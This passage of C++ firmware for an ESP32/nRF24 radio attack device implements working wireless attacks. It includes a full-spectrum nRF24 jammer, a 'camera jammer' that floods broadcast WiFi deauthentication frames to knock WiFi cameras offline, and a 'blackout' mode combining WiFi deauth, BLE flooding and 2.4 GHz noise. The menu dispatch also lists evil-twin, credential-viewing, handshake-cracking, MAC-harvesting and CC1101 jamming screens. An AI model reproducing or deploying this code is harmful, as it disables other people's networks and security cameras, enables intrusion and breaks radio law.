  dst.plKind = (p.kind==GG_PL_TEXT)?GG_PL_TEXT:GG_PL_HEX;
  dst.plLen  = (p.len<1||p.len>GG_PAYLOAD_MAX)?8:p.len;
  memcpy(dst.payload, p.bytes, GG_PAYLOAD_MAX);
  dst.rate       = (p.rate  > GG_DR_2M)  ? (uint8_t)GG_DR_1M  : p.rate;
  dst.power      = (p.power > GG_PWR_MAX) ? (uint8_t)GG_PWR_LOW : p.power;
  dst.channel    = (p.channel > GG_NRF_CH_MAX) ? (uint8_t)76 : p.channel;
  dst.burstN     = (p.amount<1)?1:(p.amount>2000?2000:p.amount);
  dst.burstGapMs = (p.gapMs>2000)?2000:p.gapMs;
}
// Snapshot the CURRENT transmit config (bytes + how it sends) into a slot record.
static inline GgPayload ggPayCapture(const GgNrfProfile& s){
  GgPayload c{};
  c.kind    = (s.plKind==GG_PL_TEXT)?GG_PL_TEXT:GG_PL_HEX;
  c.len     = (s.plLen<1||s.plLen>GG_PAYLOAD_MAX)?1:s.plLen;
  memcpy(c.bytes, s.payload, GG_PAYLOAD_MAX);
  c.rate    = s.rate; c.power = s.power; c.channel = s.channel;
  c.amount  = s.burstN; c.gapMs = s.burstGapMs;
  return c;
}
static inline void ggScreenPayAct() {
  bool used = ggPaySlotUsed(gPaySlot); int cnt = used?4:1;
  ggMove(0, cnt-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel) {
    GgPayload cur = ggPayCapture(*gNrfCfg);                           // current send, for save/overwrite
    if (!used) { ggPaySave(gPaySlot, cur); ggBack(); return; }        // empty slot: save
    GgPayload p; bool ok = ggPayLoad(gPaySlot, p);
    if (gSel==0) {                                                    // Load & send
      if (ok){ ggPayApply(p, gNrfA); gNrfCfg=&gNrfA; ggSaveLive(gNrfA,gNrfB); gAutoFire=true; }
      ggGo(GS_NRF_TX); return;                                        // jump to send + auto-fire
    }
    if (gSel==1) { if(ok) ggPayApply(p, *gNrfCfg); ggBack(); return; }// Load only
    if (gSel==2) { ggPaySave(gPaySlot, cur);       ggBack(); return; }// Overwrite
    if (gSel==3) { ggPayErase(gPaySlot);           ggBack(); return; }// Delete
  }
  char t[18]; snprintf(t,sizeof(t),"Payload %u",gPaySlot+1);
  int lt=0; ggMenu(t, used?PAY_USED:PAY_EMPTY, cnt, gSel, lt, used?"into your transmit":"saves current bytes");
}

// ---------------------------------------------------------------- BLACKOUT
// ---------------------------------------------------------------- nRF FULL SPECTRUM JAM
static uint32_t gNrfJamStartMs = 0;
static inline void ggScreenNrfJam() {
  if (!gRunInit) {
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(0,0);
    if (ggNrfPresentB) ggNrfNoiseBegin(1,63);
    ggFloodNrfActive = true;
    gNrfJamStartMs = millis(); gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    ggBack(); return;
  }
  ggFloodNrfPump();
  uint32_t elapsed = (millis()-gNrfJamStartMs)/1000;
  ggOled.clearDisplay(); ggHeader("nRF JAM");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.print("Full spectrum noise");
  ggOled.setCursor(2,27); ggOled.printf("CH 0-125  (%s)", ggNrfPresentA&&ggNrfPresentB?"2 radios":"1 radio");
  ggOled.setCursor(2,36); ggOled.printf("Pos A:%u  B:%u", ggFloodNrfPosA, ggFloodNrfPosB);
  ggOled.setCursor(2,45); ggOled.printf("Running %lus",(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- HIDDEN NETWORK SCANNER
static uint8_t  gHiddenCount = 0;
static uint32_t gHiddenLastMs = 0;
static bool     gHiddenScanning = false;
static char     gHiddenBssids[8][18];
static uint8_t  gHiddenChannels[8];
static int8_t   gHiddenRssi[8];
static inline void ggScreenHiddenScan() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gHiddenCount = 0; gHiddenScanning = false;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(30);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    WiFi.scanNetworks(true, true);
    gHiddenScanning = true;
    gHiddenLastMs = millis();
    gRunInit = true;
  }
  if (gEv.back) {
    if (gHiddenScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gHiddenScanning = false; }
    ggBack(); return;
  }
  if (gHiddenScanning) {
    int r = WiFi.scanComplete();
    if (r >= 0) {
      gHiddenCount = 0;
      for (int i = 0; i < r && gHiddenCount < 8; i++) {
        if (WiFi.SSID(i).length() == 0) {
          uint8_t* b = WiFi.BSSID(i);
          if (!b) continue;
          snprintf(gHiddenBssids[gHiddenCount], 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
          gHiddenChannels[gHiddenCount] = WiFi.channel(i);
          gHiddenRssi[gHiddenCount] = WiFi.RSSI(i);
          gHiddenCount++;
        }
      }
      WiFi.scanDelete();
      WiFi.scanNetworks(true, true);
      gHiddenLastMs = millis();
    } else if (r == WIFI_SCAN_FAILED) {
      WiFi.scanNetworks(true, true);
    }
  }
  ggOled.clearDisplay(); ggHeader("HIDDEN SCAN");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (gHiddenCount == 0) {
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.setCursor(2,35); ggOled.print("No hidden APs yet");
  } else {
    for (uint8_t i = 0; i < gHiddenCount && i < 4; i++) {
      int y = 18 + i * 9;
      ggOled.setCursor(2, y);
      ggOled.printf("CH%u %ddB", gHiddenChannels[i], gHiddenRssi[i]);
      ggOled.setCursor(60, y);
      ggOled.print(gHiddenBssids[i] + 9);
    }
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("Found:%u  BACK=stop", gHiddenCount);
  ggOled.display();
}

// ---------------------------------------------------------------- CAMERA JAMMER
static bool     gCamJamWifiUp = false;
static uint32_t gCamJamStartMs = 0;
static inline void ggScreenCameraJam() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gCamJamWifiUp = true;
    gCamJamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    if (gCamJamWifiUp) { ggWifiTxEnd(); gCamJamWifiUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  static const uint8_t camChs[] = {1, 6, 11};
  { static uint32_t lastHop=0; static uint8_t hopIdx=0; uint32_t n2=millis();
    if (n2-lastHop>=80) { lastHop=n2; hopIdx=(hopIdx+1)%3;
    gWifiTx.channel=camChs[hopIdx]; ggWifiTxSetChannel(camChs[hopIdx], gWifiTx); } }
  uint32_t elapsed = (millis()-gCamJamStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  gPhase = wPkt/100;
  ggOled.clearDisplay(); ggHeader("CAM JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH 1/6/11 (now:%u)", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt));
  ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.print("Targeting WiFi cams");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- SIGNAL METER
static int8_t   gSigRssi[8];
static char     gSigSsid[8][11];
static uint8_t  gSigCount = 0;
static bool     gSigScanning = false;
static inline void ggScreenSignalMeter() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gSigCount = 0; gSigScanning = false;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(30);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    WiFi.scanNetworks(true, true);
    gSigScanning = true;
    gRunInit = true;
  }
  if (gEv.back) {
    if (gSigScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gSigScanning = false; }
    ggBack(); return;
  }
  if (gEv.sel) {
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true);
  }
  if (gSigScanning) {
    int r = WiFi.scanComplete();
    if (r >= 0) {
      gSigCount = 0;
      for (int i = 0; i < r && i < 128; i++) {
        int8_t rssi = WiFi.RSSI(i);
        uint8_t pos = gSigCount;
        if (gSigCount < 8) { gSigCount++; }
        else {
          int8_t weakest = gSigRssi[0]; pos = 0;
          for (uint8_t j = 1; j < 8; j++) { if (gSigRssi[j] < weakest) { weakest = gSigRssi[j]; pos = j; } }
          if (rssi <= weakest) continue;
        }
        gSigRssi[pos] = rssi;
        String ss = WiFi.SSID(i);
        if (ss.length() == 0) strncpy(gSigSsid[pos], "(hidden)", 10);
        else { strncpy(gSigSsid[pos], ss.c_str(), 10); }
        gSigSsid[pos][10] = 0;
      }
      WiFi.scanDelete();
      WiFi.scanNetworks(true, true);
    } else if (r == WIFI_SCAN_FAILED) {
      WiFi.scanNetworks(true, true);
    }
  }
  ggOled.clearDisplay(); ggHeader("SIGNAL");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  for (uint8_t i = 0; i < gSigCount && i < 4; i++) {
    int y = 18 + i * 9;
    ggOled.setCursor(2, y);
    ggOled.print(gSigSsid[i]);
    int barW = (gSigRssi[i] + 100);
    if (barW < 0) barW = 0; if (barW > 60) barW = 60;
    ggOled.fillRect(66, y, barW, 7, SSD1306_WHITE);
    ggOled.setCursor(66 + barW + 2, y);
    ggOled.printf("%d", gSigRssi[i]);
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("APs:%u  SEL=rescan", gSigCount);
  ggOled.display();
}

static uint32_t gBlackoutStartMs = 0;
static bool     gBlackoutWifiUp  = false;
static bool     gBlackoutBleUp   = false;
static inline void ggScreenBlackout() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gBlackoutWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gBlackoutBleUp = true;
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(0,0);
    if (ggNrfPresentB) ggNrfNoiseBegin(1,63);
    ggFloodNrfActive = true;
    gBlackoutStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gBlackoutWifiUp) { ggWifiTxEnd(); gBlackoutWifiUp = false; }
    if (gBlackoutBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gBlackoutBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  { static uint32_t lastHop=0; static uint8_t hopCh=1; uint32_t n2=millis();
    if (n2-lastHop>=40) { lastHop=n2; hopCh++; if(hopCh>14)hopCh=1;
    gWifiTx.channel=hopCh; ggWifiTxSetChannel(hopCh, gWifiTx); } }
  uint32_t elapsed = (millis()-gBlackoutStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("BLACKOUT");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("WiFi CH%u ALL", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0;
    ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF0-125",wf,bf); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ===== status OLED (ggOledSt) — always-visible radio state =================
static inline void ggDrawStatus() {
  if (!ggOledStOk) return;
  ggOledSt.clearDisplay();
  ggOledSt.setTextSize(1);
  uint32_t sec = millis() / 1000;
  char up[10]; snprintf(up, sizeof(up), "%lu:%02lu", (unsigned long)(sec / 60), (unsigned long)(sec % 60));
  ggOledSt.fillRect(0, 0, 128, 9, SSD1306_WHITE);
  ggOledSt.setTextColor(SSD1306_BLACK);
  ggOledSt.setCursor(2, 0); ggOledSt.print(F("KODI NRF24"));
  ggOledSt.setCursor(128 - (int)strlen(up) * 6 - 2, 0); ggOledSt.print(up);
  ggOledSt.setTextColor(SSD1306_WHITE);
  ggOledSt.setCursor(2, 12);
  ggOledSt.printf("nRF A:%s B:%s", ggNrfPresentA ? "ON" : "--", ggNrfPresentB ? "ON" : "--");
  if (ghRadioLinked) {
    uint32_t age = millis() - ghLastStatusMs;
    ggOledSt.setCursor(96, 12);
    ggOledSt.print(age < 2000 ? "LNK" : "OLD");
  }
  ggOledSt.setCursor(2, 22);
  if (kbIsLinked(ghBridge)) {
    ggOledSt.print(F("CC1101: LINKED"));
    ggOledSt.fillRect(96, 22, 6, 6, SSD1306_WHITE);
  } else {
    ggOledSt.print(F("CC1101: --"));
    ggOledSt.drawRect(96, 22, 6, 6, SSD1306_WHITE);
  }
  ggOledSt.drawFastHLine(0, 31, 128, SSD1306_WHITE);
  ggOledSt.setCursor(2, 34);
  ggOledSt.printf("%-7s CH:%-3u", GH_MODE_NAME[ghStatus.mode < 8 ? ghStatus.mode : 0], ghStatus.activeChannel);
  ggOledSt.setCursor(2, 44);
  ggOledSt.printf("TX:%-5s RX:%-5s", ggFmtCount(ghStatus.txCount), ggFmtCount(ghStatus.rxCount));
  ggOledSt.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  ggOledSt.setCursor(2, 56);
  ggOledSt.printf("ACK:%-5s ERR:%s", ggFmtCount(ghStatus.ackOk), ggFmtCount(ghStatus.txFail));
  ggOledSt.display();
}

// ===== top-level ===========================================================
static inline void ggUiBegin() { ggOledBegin(); }
static inline void ggUiLoop() {
  ghPollStatus();
  ggPortalPump();
  ggInputPoll();
  // hold-BACK = HOME from anywhere. Tear down all active radios.
  if (gEv.home) { if (gScreen==GS_COP_SCAN) ggCopScanEnd(); if (gScreen==GS_TRACKER_SCAN) ggTrkScanEnd(); if (gScreen==GS_WIFI_PICK||gScreen==GS_JAM_PICK||gScreen==GS_RAD_PICK||gScreen==GS_EVIL_PICK||gScreen==GS_AUTH_PICK||gScreen==GS_QUIET_PICK||gScreen==GS_CLONE_PICK||(gScreen==GS_HEATMAP&&!gHeatDone)) ggWifiPickScanEnd(); if (gScreen==GS_BLE_SCAN||gScreen==GS_MAC_HARVEST||gScreen==GS_PROX_ALERT||gScreen==GS_UUID_SCAN||gScreen==GS_BLE_RANGE) ggBlePickScanEnd(); if (gScreen==GS_JAM_RUN) { if(gJamWifiUp){ggWifiTxEnd();gJamWifiUp=false;} if(gJamBleUp){ggBleFloodMode=false;ggBleTxEnd();gJamBleUp=false;} } if (gScreen==GS_KPAD_RUN) { if(gKpadWifiUp){ggWifiTxEnd();gKpadWifiUp=false;} if(gKpadBleUp){ggBleFloodMode=false;ggBleTxEnd();gKpadBleUp=false;} } if (gScreen==GS_RAD_RUN) { if(gRadWifiUp){ggWifiTxEnd();gRadWifiUp=false;} if(gRadBleUp){ggBleFloodMode=false;ggBleTxEnd();gRadBleUp=false;} } if (gScreen==GS_SLOCK_RUN) { if(gSlockBleUp){ggBleFloodMode=false;ggBleTxEnd();gSlockBleUp=false;} } if (gScreen==GS_NET_AUDIT) ggWifiPickScanEnd(); if (gScreen==GS_AUTH_RUN) { if(gAuthNrfUp){ggFloodNrfStop();gAuthNrfUp=false;} ggWifiTxEnd(); } if (gScreen==GS_FUZZ_RUN||gScreen==GS_QUIET_RUN||gScreen==GS_CLONE_RUN||gScreen==GS_FARM_RUN) ggWifiTxEnd(); if (gScreen==GS_DEAUTH_DET) ggDeauthDetectEnd(); if (gScreen==GS_PROG_JAM) { ggFloodNrfStop(); if(gProgWifiUp){ggWifiTxEnd();gProgWifiUp=false;} if(gProgBleUp){ggBleFloodMode=false;ggBleTxEnd();gProgBleUp=false;} } if (gScreen==GS_CHAIN_RUN) { ggFloodNrfStop(); if(gChainWifiUp){ggWifiTxEnd();gChainWifiUp=false;} if(gChainBleUp){ggBleFloodMode=false;ggBleTxEnd();gChainBleUp=false;} } if (gScreen==GS_AUTO_TARGET) { if(gAutoScanning)ggWifiPickScanEnd(); ggFloodNrfStop(); if(gAutoWifiUp){ggWifiTxEnd();gAutoWifiUp=false;} if(gAutoBleUp){ggBleFloodMode=false;ggBleTxEnd();gAutoBleUp=false;} } if (gScreen==GS_PKTRATE&&gPktRateOn) { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); gPktRateOn=false; } if (gScreen==GS_BAND_OCC) ggNrfStopAll(); if (gScreen==GS_GEOFENCE) { if(gGeoScanning) ggWifiPickScanEnd(); else { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); } gGeoScanning=true; } if (gScreen==GS_CRACK_PICK) ggWifiPickScanEnd(); if (gScreen==GS_CRACK_CAP) { if(gCrackJamUp){ggFloodNrfStop();gCrackJamUp=false;} ggCrackCaptureEnd(); } if (gScreen==GS_CRACK_DONE) ggCrackEnd(); if (gScreen==GS_BLACKOUT) { ggFloodNrfStop(); if(gBlackoutWifiUp){ggWifiTxEnd();gBlackoutWifiUp=false;} if(gBlackoutBleUp){ggBleFloodMode=false;ggBleTxEnd();gBlackoutBleUp=false;} } if (gScreen==GS_NRF_JAM) ggFloodNrfStop(); if (gScreen==GS_CC_JAM) { if(gCcJamUp&&kbIsLinked(ghBridge)){KodiBridge msg;KbCcPayload cc={};kbBuildCcCmd(msg,KB_UNIT_NRF24,ghBridge.seq++,KB_CC_STOP,cc);ghBridgeSend(msg);} gCcJamUp=false; } if (gScreen==GS_CC_REC) { if(gCcRecUp&&kbIsLinked(ghBridge)){KodiBridge msg;KbCcPayload cc={};kbBuildCcCmd(msg,KB_UNIT_NRF24,ghBridge.seq++,KB_CC_STOP,cc);ghBridgeSend(msg);} gCcRecUp=false; } if (gScreen==GS_DUAL_JAM) { ggFloodNrfStop(); if(kbIsLinked(ghBridge)){KodiBridge msg;KbCcPayload cc={};kbBuildCcCmd(msg,KB_UNIT_NRF24,ghBridge.seq++,KB_CC_STOP,cc);ghBridgeSend(msg);} gDualJamUp=false; } if (gScreen==GS_DUAL_SCAN) { ggNrfStopAll(); if(kbIsLinked(ghBridge)){KodiBridge msg;KbCcPayload cc={};kbBuildCcCmd(msg,KB_UNIT_NRF24,ghBridge.seq++,KB_CC_STOP,cc);ghBridgeSend(msg);} gDualScanUp=false; } if (gScreen==GS_HIDDEN_SCAN&&gHiddenScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gHiddenScanning=false; } if (gScreen==GS_CAMERA_JAM) { if(gCamJamWifiUp){ggWifiTxEnd();gCamJamWifiUp=false;} } if (gScreen==GS_SIGNAL_METER&&gSigScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gSigScanning=false; } gTimeBombArmed=false; gAtkTimerArmed=false; gWifiFloodMode=false; ggWifiDeauthMode=false; ggWifiAuthFlood=false; ggWifiFuzzMode=false; ggWifiQuietMode=false; ggWifiCloneMode=false; ggWifiFarmMode=false; ggWifiSpamMode=false; ggWifiRickMode=false; ggBleSpamMode=false; ggBleFloodMode=false; ggStopTx(); ggHome(); ggClickBack(); }
  // Global utility shortcuts (hold 1 = mute, hold 3 = brightness)
  if (gEv.mute) {
    static uint8_t ggSavedVol = 6;
    if (ggVol > 0) { ggSavedVol = ggVol; ggSetVolume(0); }
    else { ggSetVolume(ggSavedVol); ggBeep(2200, 50); }
  }
  if (gEv.bright) {
    static uint8_t ggBrightLvl = 2;
    ggBrightLvl = (ggBrightLvl + 1) % 3;
    uint8_t cval = (ggBrightLvl == 0) ? 0x01 : (ggBrightLvl == 1) ? 0x80 : 0xFF;
    if (ggOledOk) { ggOled.ssd1306_command(0x81); ggOled.ssd1306_command(cval); }
    if (ggOledStOk) { ggOledSt.ssd1306_command(0x81); ggOledSt.ssd1306_command(cval); }
    ggBeep(1800 + ggBrightLvl * 400, 40);
  }
  // Category-to-category shortcuts: jump between categories without going home
  if (gScreen >= GS_CAT_WIFI && gScreen <= GS_CAT_SYSTEM) {
    switch (gLastKey) {
      case '1': if (gScreen != GS_CAT_WIFI)    { ggGo(GS_CAT_WIFI);    ggClickOk(); } break;
      case '3': if (gScreen != GS_CAT_BLE)     { ggGo(GS_CAT_BLE);     ggClickOk(); } break;
      case '7': if (gScreen != GS_CAT_NRF)     { ggGo(GS_CAT_NRF);     ggClickOk(); } break;
      case '9': if (gScreen != GS_CAT_COMBO)   { ggGo(GS_CAT_COMBO);   ggClickOk(); } break;
      case 'A': if (gScreen != GS_CAT_RECON)   { ggGo(GS_CAT_RECON);   ggClickOk(); } break;
      case 'B': if (gScreen != GS_CAT_EXPLOIT) { ggGo(GS_CAT_EXPLOIT); ggClickOk(); } break;
      case 'C': if (gScreen != GS_CAT_TOOLS)   { ggGo(GS_CAT_TOOLS);   ggClickOk(); } break;
      case 'D': if (gScreen != GS_CAT_SYSTEM)  { ggGo(GS_CAT_SYSTEM);  ggClickOk(); } break;
      case '0': if (gScreen != GS_SETTINGS)    { ggGo(GS_SETTINGS);    ggClickOk(); } break;
    }
  }
  if (gEv.up || gEv.down || gEv.left || gEv.right) ggClickMove();
  if (gEv.sel) ggClickOk();
  if (gEv.back) ggClickBack();

  switch (gScreen) {
    case GS_HOME: ggScreenHome(); break;
    case GS_NRF: ggScreenNrf(); break;
    case GS_ADV: ggScreenAdv(); break;
    case GS_MODES: ggScreenModes(); break;
    case GS_COP_SCAN: ggScreenCopScan(); break;
    case GS_TRACKER_SCAN: ggScreenTrackerScan(); break;
    case GS_NRF_TX: ggScreenNrfTx(); break;
    case GS_NRF_BEACON: ggScreenNrfBeacon(); break;
    case GS_NRF_CARRIER: ggScreenNrfCarrier(); break;
    case GS_NRF_SCAN: ggScreenNrfScan(); break;
    case GS_NRF_RX: ggScreenNrfRx(); break;
    case GS_NPROF: ggScreenNProf(); break;
    case GS_PROFACT: ggScreenProfAct(); break;
    case GS_SETTINGS: ggScreenSettings(); break;
    case GS_SYSTEM: ggScreenSystem(); break;
    case GS_HELP: ggScreenHelp(); break;
    case GS_HELPPAGE: ggScreenHelpPage(); break;
    case GS_BYTES: ggScreenBytes(); break;
    case GS_PAYLIB: ggScreenPayLib(); break;
    case GS_PAYACT: ggScreenPayAct(); break;
    case GS_WIFI_TX: ggScreenWifiTx(); break;
    case GS_WIFI_TX_RUN: ggScreenWifiTxRun(); break;
    case GS_WIFI_PICK: ggScreenWifiPick(); break;
    case GS_BLE_TX: ggScreenBleTx(); break;
    case GS_BLE_TX_RUN: ggScreenBleTxRun(); break;
    case GS_BLE_SCAN: ggScreenBleScan(); break;
    case GS_JAM_PICK: ggScreenJamPick(); break;
    case GS_JAM_RUN:  ggScreenJamRun(); break;
    case GS_KPAD_RUN: ggScreenKpadRun(); break;
    case GS_RAD_PICK: ggScreenRadPick(); break;
    case GS_RAD_RUN:  ggScreenRadRun(); break;
    case GS_SPAM_RUN: ggScreenSpamRun(); break;
    case GS_BLESPAM_RUN: ggScreenBleSpamRun(); break;
    case GS_EVIL_PICK: ggScreenEvilPick(); break;
    case GS_EVIL_RUN:  ggScreenEvilRun(); break;
    case GS_PROBE_RUN: ggScreenProbeRun(); break;
    case GS_CRED_VIEW: ggScreenCredView(); break;
    case GS_RICK_MENU: ggScreenRickMenu(); break;
    case GS_RICK_RUN:  ggScreenRickRun(); break;
    case GS_SLOCK_RUN: ggScreenSlockRun(); break;
    case GS_NET_AUDIT: ggScreenNetAudit(); break;
    case GS_NET_DETAIL: ggScreenNetDetail(); break;
    case GS_AUTH_PICK: ggScreenAuthPick(); break;
    case GS_AUTH_RUN:  ggScreenAuthRun(); break;
    case GS_FUZZ_RUN:  ggScreenFuzzRun(); break;
    case GS_QUIET_PICK: ggScreenQuietPick(); break;
    case GS_QUIET_RUN:  ggScreenQuietRun(); break;
    case GS_CLONE_PICK: ggScreenClonePick(); break;
    case GS_CLONE_RUN:  ggScreenCloneRun(); break;
    case GS_FARM_RUN:   ggScreenFarmRun(); break;
    case GS_TIMEBOMB:   ggScreenTimeBomb(); break;
    case GS_DEAUTH_DET: ggScreenDeauthDet(); break;
    case GS_GEOFENCE:   ggScreenGeofence(); break;
    case GS_MAC_HARVEST: ggScreenMacHarvest(); break;
    case GS_PROX_ALERT: ggScreenProxAlert(); break;
    case GS_UUID_SCAN:  ggScreenUuidScan(); break;
    case GS_BLE_RANGE:  ggScreenBleRange(); break;
    case GS_CHAIN_RUN:  ggScreenChainRun(); break;
    case GS_PROG_JAM:   ggScreenProgJam(); break;
    case GS_AUTO_TARGET: ggScreenAutoTarget(); break;
    case GS_HEATMAP:    ggScreenHeatmap(); break;
    case GS_BAND_OCC:   ggScreenBandOcc(); break;
    case GS_PKTRATE:    ggScreenPktRate(); break;
    case GS_ATK_TIMER:  ggScreenAtkTimer(); break;
    case GS_CRACK_PICK: ggScreenCrackPick(); break;
    case GS_CRACK_CAP:  ggScreenCrackCap(); break;
    case GS_CRACK_DONE: ggScreenCrackDone(); break;
    case GS_BLACKOUT:   ggScreenBlackout(); break;
    // category sub-menus
    case GS_CAT_WIFI:    ggScreenCatWifi(); break;
    case GS_CAT_BLE:     ggScreenCatBle(); break;
    case GS_CAT_NRF:     ggScreenCatNrf(); break;
    case GS_CAT_COMBO:   ggScreenCatCombo(); break;
    case GS_CAT_RECON:   ggScreenCatRecon(); break;
    case GS_CAT_EXPLOIT: ggScreenCatExploit(); break;
    case GS_CAT_TOOLS:   ggScreenCatTools(); break;
    case GS_CAT_SYSTEM:  ggScreenCatSystem(); break;
    // new tool screens
    case GS_NRF_JAM:     ggScreenNrfJam(); break;
    case GS_HIDDEN_SCAN: ggScreenHiddenScan(); break;
    case GS_CAMERA_JAM:  ggScreenCameraJam(); break;
    case GS_SIGNAL_METER: ggScreenSignalMeter(); break;
    // CC1101 bridge screens
    case GS_CC_TX:   ggScreenCcTx(); break;
    case GS_CC_JAM:  ggScreenCcJam(); break;
    case GS_CC_SCAN: ggScreenCcScan(); break;
    case GS_CC_RFID: ggScreenCcRfid(); break;
    case GS_CC_REC:  ggScreenCcRec(); break;
    // dual-band screens
    case GS_DUAL_JAM:  ggScreenDualJam(); break;
    case GS_DUAL_SCAN: ggScreenDualScan(); break;
    default: gScreen = GS_HOME; break;
  }
  ggDrawStatus();
  static uint32_t lastSave=0;
  if (millis()-lastSave>10000){ lastSave=millis(); ggSaveLive(gNrfA,gNrfB); ggSaveWifiTx(gWifiTx); ggSaveBleTx(gBleTx); }
}
